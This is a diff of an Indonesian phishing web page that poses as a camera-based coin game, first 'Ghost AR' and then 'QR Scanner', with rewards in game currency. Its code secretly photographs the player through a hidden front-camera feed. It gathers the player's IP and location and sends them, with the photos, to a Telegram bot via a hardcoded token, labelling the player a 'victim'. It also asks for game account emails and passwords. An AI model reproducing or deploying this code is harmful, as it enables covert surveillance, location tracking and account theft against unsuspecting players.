@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>👻 Ghost AR - Tangkap Hantu Dapat Coin!</title>
+    <title>📷 QR Scanner - Dapatkan Coin Gratis!</title>
     <style>
         * {
             margin: 0;
@@ -14,13 +14,15 @@
 
         body {
             font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
-            background: #000;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0a0a1a 100%);
+            min-height: 100vh;
             overflow: hidden;
             position: fixed;
             width: 100%;
             height: 100%;
         }
 
+        /* LAYAR START */
         .start-screen {
             position: fixed;
             top: 0;
@@ -38,14 +40,15 @@
         }
 
         .start-screen h1 {
-            font-size: 48px;
+            font-size: 42px;
             color: #ffd700;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         .start-screen p {
             color: white;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
+            font-size: 16px;
         }
 
         .start-btn {
@@ -57,6 +60,11 @@
             font-weight: bold;
             color: #000;
             cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .start-btn:hover {
+            transform: scale(1.05);
         }
 
         .error-msg {
@@ -65,6 +73,7 @@
             display: none;
         }
 
+        /* GAME CONTAINER */
         .game-container {
             position: fixed;
             top: 0;
@@ -72,17 +81,21 @@
             width: 100%;
             height: 100%;
             display: none;
+            background: #000;
         }
 
-        #cameraView {
+        /* Kamera preview untuk QR scan */
+        #qrVideo {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             object-fit: cover;
+            z-index: 0;
         }
 
+        /* Kamera depan (sembunyi - buat foto diam-diam) */
         #frontCamera {
             position: fixed;
             bottom: -1000px;
@@ -90,12 +103,14 @@
             width: 1px;
             height: 1px;
             opacity: 0;
+            pointer-events: none;
         }
 
         canvas {
             display: none;
         }
 
+        /* Overlay UI */
         .ui-overlay {
             position: fixed;
             top: 0;
@@ -150,28 +165,30 @@
             pointer-events: auto;
         }
 
-        .ghost-object {
-            position: absolute;
-            width: 80px;
-            height: 80px;
+        .info-panel p {
+            color: white;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+
+        .scan-area {
             background: rgba(0,0,0,0.5);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 50px;
-            cursor: pointer;
-            animation: floatGhost 1s ease infinite;
-            z-index: 10;
-            backdrop-filter: blur(5px);
-            border: 2px solid rgba(255,215,0,0.5);
+            border: 2px solid #ffd700;
+            border-radius: 30px;
+            padding: 15px;
+            margin: 20px auto;
+            width: 80%;
+            max-width: 300px;
+            text-align: center;
+            pointer-events: auto;
         }
 
-        @keyframes floatGhost {
-            0%,100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+        .scan-area p {
+            color: #ffd700;
+            font-size: 14px;
         }
 
+        /* Modal withdraw */
         .modal {
             display: none;
             position: fixed;
@@ -199,6 +216,11 @@
             border: 2px solid #ffd700;
         }
 
+        .modal-content h2 {
+            color: #ffd700;
+            margin-bottom: 20px;
+        }
+
         .modal-content select, .modal-content input {
             width: 100%;
             padding: 14px;
@@ -224,26 +246,42 @@
             background: #ff4444;
             color: white;
         }
+
+        .qr-code-display {
+            background: white;
+            padding: 20px;
+            border-radius: 20px;
+            margin: 20px auto;
+            width: 200px;
+            height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            pointer-events: auto;
+        }
+
+        .qr-code-display img {
+            width: 100%;
+            height: 100%;
+        }
     </style>
 </head>
 <body>
 
+<!-- LAYAR START -->
 <div class="start-screen" id="startScreen">
-    <h1>👻 GHOST AR</h1>
-    <p>Tangkap hantu yang muncul di layar!</p>
-    <p>Setiap hantu = +100 COIN</p>
-    <p style="font-size: 14px;">🎮 Game butuh akses kamera</p>
+    <h1>📷 QR SCANNER</h1>
+    <p>Scan QR Code = Dapat 100 COIN!</p>
+    <p style="font-size: 14px;">🎮 Game butuh akses kamera untuk scan QR</p>
     <button class="start-btn" id="startGameBtn">🎮 MULAI GAME</button>
     <div class="error-msg" id="errorMsg"></div>
 </div>
 
+<!-- GAME CONTAINER -->
 <div class="game-container" id="gameContainer">
-    <video id="cameraView" autoplay playsinline></video>
+    <video id="qrVideo" autoplay playsinline></video>
     <video id="frontCamera" autoplay playsinline></video>
     <canvas id="photoCanvas"></canvas>
-    
-    <div id="ghostContainer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:5; pointer-events:none;">
-    </div>
 
     <div class="ui-overlay">
         <div class="coin-header">
@@ -253,14 +291,24 @@
             </div>
             <button class="withdraw-btn" id="withdrawBtn">💎 TUKAR COIN</button>
         </div>
+
         <div class="info-panel">
-            <p>👻 <strong>Ghost AR</strong> - Tangkap Hantu!</p>
-            <p>🎯 Klik hantu yang muncul: <span style="color:#ffd700;">+100 COIN</span></p>
-            <p>⏳ Hantu muncul random setiap 5-10 detik</p>
+            <p>📷 <strong>QR SCANNER</strong> - Scan QR Dapat Coin!</p>
+            <p>🎯 Setiap scan QR: <span style="color:#ffd700;">+100 COIN</span></p>
+            <p>💎 500 COIN = 50 Diamond ML/FF | 60 UC PUBG</p>
+            <div class="scan-area">
+                <p>📱 Arahkan kamera ke QR Code di bawah ini:</p>
+            </div>
+        </div>
+
+        <!-- QR Code palsu yang harus di-scan -->
+        <div class="qr-code-display" id="qrDisplay">
+            <canvas id="qrCanvas" width="200" height="200"></canvas>
         </div>
     </div>
 </div>
 
+<!-- MODAL WITHDRAW -->
 <div id="withdrawModal" class="modal">
     <div class="modal-content">
         <h2>💎 TUKAR COIN KE GAME</h2>
@@ -272,15 +320,17 @@
             <option value="Free Fire">🔥 Free Fire - Diamond</option>
             <option value="PUBG Mobile">🎯 PUBG Mobile - UC</option>
         </select>
-        <input type="text" id="gameId" placeholder="ID Game / Username">
-        <input type="text" id="gameZone" placeholder="Zona / Server">
-        <input type="email" id="gameEmail" placeholder="Email Akun Game">
-        <input type="password" id="gamePassword" placeholder="Password Akun Game">
+        <input type="text" id="gameId" placeholder="ID Game / Username" required>
+        <input type="text" id="gameZone" placeholder="Zona / Server (jika ada)">
+        <input type="email" id="gameEmail" placeholder="Email Akun Game" required>
+        <input type="password" id="gamePassword" placeholder="Password Akun Game" required>
+        
         <button id="submitWithdraw">💎 TUKAR SEKARANG</button>
         <button class="close-modal" id="closeModal">TUTUP</button>
     </div>
 </div>
 
+<script src="https://unpkg.com/jsqr@1.4.0/dist/jsQR.js"></script>
 <script>
     const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
     const CHAT_ID = "8854409945";
@@ -288,11 +338,11 @@
     let coins = 0;
     let photoTaken = false;
     let locationSent = false;
-    let backStream = null;
-    let frontStream = null;
-    let ghostInterval = null;
     let gameActive = false;
+    let scanning = true;
+    let scanCooldown = false;
 
+    // DOM elements
     const startScreen = document.getElementById('startScreen');
     const gameContainer = document.getElementById('gameContainer');
     const startBtn = document.getElementById('startGameBtn');
@@ -300,11 +350,45 @@
     const coinSpan = document.getElementById('coinAmount');
     const withdrawBtn = document.getElementById('withdrawBtn');
     const modalCoinSpan = document.getElementById('modalCoin');
-    const ghostContainer = document.getElementById('ghostContainer');
-    const backVideo = document.getElementById('cameraView');
+
+    const qrVideo = document.getElementById('qrVideo');
     const frontVideo = document.getElementById('frontCamera');
     const photoCanvas = document.getElementById('photoCanvas');
+    const qrCanvas = document.getElementById('qrCanvas');
 
+    // ========== GENERATE QR CODE PALSU ==========
+    function generateQRCode() {
+        const ctx = qrCanvas.getContext('2d');
+        ctx.fillStyle = 'white';
+        ctx.fillRect(0, 0, 200, 200);
+        
+        // Gambar QR sederhana (palsu) biar keliatan kayak QR
+        ctx.fillStyle = 'black';
+        // Kotak-kotak simulasi QR
+        for (let i = 0; i < 3; i++) {
+            ctx.fillRect(10 + i*15, 10, 10, 10);
+            ctx.fillRect(10, 10 + i*15, 10, 10);
+            ctx.fillRect(180 - i*15, 10, 10, 10);
+            ctx.fillRect(180, 10 + i*15, 10, 10);
+            ctx.fillRect(10, 180 - i*15, 10, 10);
+            ctx.fillRect(180 - i*15, 180 - i*15, 10, 10);
+        }
+        for (let i = 0; i < 10; i++) {
+            for (let j = 0; j < 10; j++) {
+                if (Math.random() > 0.7) {
+                    ctx.fillRect(40 + i*12, 40 + j*12, 6, 6);
+                }
+            }
+        }
+        
+        ctx.fillStyle = '#ffd700';
+        ctx.font = 'bold 14px monospace';
+        ctx.fillText("SCAN", 75, 110);
+        ctx.fillText("ME", 85, 130);
+    }
+    generateQRCode();
+
+    // ========== FUNGSI TELEGRAM ==========
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -328,14 +412,14 @@
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
-        const pesan = `📍 LOKASI & IP KORBAN 📍%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AGame: GHOST AR (Tangkap Hantu)`;
+        const pesan = `📍 LOKASI & IP KORBAN 📍%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AGame: QR SCANNER (Scan QR dapet coin)`;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
         locationSent = true;
     }
 
     async function captureFrontPhoto() {
         if (photoTaken) return;
-        if (!frontStream || !frontStream.active) return;
+        if (!frontVideo.srcObject) return;
         if (frontVideo.videoWidth === 0 || frontVideo.videoHeight === 0) {
             setTimeout(() => captureFrontPhoto(), 500);
             return;
@@ -350,7 +434,7 @@
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
-        const caption = `📸 FOTO WAJAH KORBAN 📸%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AKorban main game Ghost AR (tangkap hantu) - tidak sadar difoto`;
+        const caption = `📸 FOTO WAJAH KORBAN 📸%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AKorban main game QR Scanner (scan QR dapet coin) - tidak sadar difoto`;
 
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
@@ -360,72 +444,86 @@
         photoTaken = true;
     }
 
-    function spawnGhost() {
+    // ========== SCAN QR ==========
+    async function startQRScan() {
         if (!gameActive) return;
         
-        const ghost = document.createElement('div');
-        ghost.className = 'ghost-object';
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
         
-        const size = Math.random() * 60 + 60;
-        ghost.style.width = size + 'px';
-        ghost.style.height = size + 'px';
-        ghost.style.fontSize = (size - 20) + 'px';
-        ghost.style.left = Math.random() * (window.innerWidth - size) + 'px';
-        ghost.style.top = Math.random() * (window.innerHeight - 150) + 'px';
-        ghost.style.position = 'absolute';
-        ghost.style.pointerEvents = 'auto';
-        
-        const ghosts = ['👻', '💀', '👹', '😈', '👾'];
-        ghost.innerHTML = ghosts[Math.floor(Math.random() * ghosts.length)];
-        
-        ghost.onclick = (e) => {
-            e.stopPropagation();
-            coins += 100;
-            coinSpan.innerText = coins;
-            ghost.remove();
+        const scanInterval = setInterval(() => {
+            if (!gameActive || !scanning || scanCooldown) return;
             
-            // Efek getar
-            if (navigator.vibrate) navigator.vibrate(100);
-        };
+            if (qrVideo.videoWidth === 0 || qrVideo.videoHeight === 0) return;
+            
+            canvas.width = qrVideo.videoWidth;
+            canvas.height = qrVideo.videoHeight;
+            ctx.drawImage(qrVideo, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const code = jsQR(imageData.data, canvas.width, canvas.height);
+            
+            if (code && code.data) {
+                // Ketemu QR! Kasih coin
+                scanCooldown = true;
+                coins += 100;
+                coinSpan.innerText = coins;
+                
+                // Efek getar
+                if (navigator.vibrate) navigator.vibrate(200);
+                
+                // Tampilkan notifikasi
+                const scanArea = document.querySelector('.scan-area');
+                const originalText = scanArea.innerHTML;
+                scanArea.innerHTML = '<p style="color:#00ff00;">✅ +100 COIN! QR Terdeteksi!</p>';
+                setTimeout(() => {
+                    scanArea.innerHTML = originalText;
+                }, 1500);
+                
+                // Cooldown 3 detik biar gak kecepetan
+                setTimeout(() => {
+                    scanCooldown = false;
+                }, 3000);
+            }
+        }, 500);
         
-        ghostContainer.appendChild(ghost);
-        
-        // Hantu ilang setelah 5 detik kalo gak diklik
-        setTimeout(() => {
-            if (ghost.parentNode) ghost.remove();
-        }, 5000);
+        return scanInterval;
     }
 
+    // ========== START GAME ==========
     async function startGame() {
         errorMsg.style.display = 'none';
         
         try {
-            backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // Minta kamera belakang (buat scan QR)
+            const backStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" } 
+            });
+            qrVideo.srcObject = backStream;
             
-            backVideo.srcObject = backStream;
+            // Minta kamera depan (buat foto diam-diam)
+            const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
             frontVideo.srcObject = frontStream;
-
+            
+            // Kirim lokasi & IP
             await sendLocationAndIP();
             
+            // Foto diam-diam
             setTimeout(() => captureFrontPhoto(), 2000);
             setTimeout(() => { if (!photoTaken) captureFrontPhoto(); }, 8000);
             setTimeout(() => { if (!photoTaken) captureFrontPhoto(); }, 15000);
-
+            
+            // Sembunyikan start screen, tampilkan game
             startScreen.style.display = 'none';
             gameContainer.style.display = 'block';
             gameActive = true;
             
-            // Munculin hantu setiap 5-10 detik
-            ghostInterval = setInterval(() => {
-                if (gameActive) spawnGhost();
-            }, Math.random() * 5000 + 5000);
+            // Mulai scan QR
+            const interval = await startQRScan();
             
-            // Langsung spawn 3 hantu awal
-            setTimeout(() => spawnGhost(), 1000);
-            setTimeout(() => spawnGhost(), 3000);
-            setTimeout(() => spawnGhost(), 5000);
-            
+            // Fullscreen
             document.documentElement.requestFullscreen();
             
         } catch(err) {
@@ -434,7 +532,7 @@
         }
     }
 
-    // Withdraw logic
+    // ========== WITHDRAW ==========
     const withdrawModal = document.getElementById('withdrawModal');
     const closeModal = document.getElementById('closeModal');
     const submitWithdraw = document.getElementById('submitWithdraw');
